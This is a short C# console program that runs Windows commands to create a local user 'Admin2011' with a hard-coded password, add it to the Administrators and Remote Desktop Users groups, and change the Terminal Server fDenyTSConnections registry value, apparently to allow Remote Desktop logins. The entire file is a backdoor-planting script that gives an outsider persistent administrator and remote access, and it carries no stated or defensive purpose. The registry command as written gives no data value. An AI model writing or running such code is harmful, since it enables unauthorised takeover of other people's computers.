using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;


namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            RunProcess("net.exe", "user Admin2011 password1! /add");
            RunProcess("net.exe", "localgroup Administrators Admin2011 /add");
            RunProcess("net.exe", "localgroup \"Remote Desktop Users\" Admin2011 /add");
            RunProcess("reg.exe", "add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections");
        }


        public static void RunProcess(String FileName,String Argument)
        {

            Process Process = new Process();

            Process.StartInfo.FileName = FileName;
            Process.StartInfo.Arguments = Argument;

            Process.Start();
        }

    }
}
